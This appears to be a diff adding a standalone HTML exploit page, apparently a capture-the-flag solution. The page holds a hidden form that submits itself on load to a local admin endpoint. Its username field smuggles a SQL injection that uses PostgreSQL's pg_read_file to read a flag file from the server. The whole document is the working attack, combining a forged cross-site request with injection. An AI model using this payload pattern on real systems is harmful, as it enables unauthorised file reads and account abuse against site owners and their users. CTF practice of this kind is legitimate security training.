@@ -1,0 +1,20 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>EXPLOIT</title>
+</head>
+<body>
+    <form id="autoSubmitForm" action="http://127.0.0.1:5000/admin" method="post">
+        <input type="hidden" name="username" value="yqroo', (select pg_read_file('/flag_vrsd2mReIvQJBopysBuJbl6aNVqZs5N1.txt'))) --"> <!-- CHANGE THE FLAG -->
+        <p><input type="submit" value="exploit"></p>
+    </form>
+    <script>
+        document.addEventListener('DOMContentLoaded', () => {
+            const form = document.getElementById('autoSubmitForm');
+            form.submit();
+        });
+    </script>
+</body>
+</html>
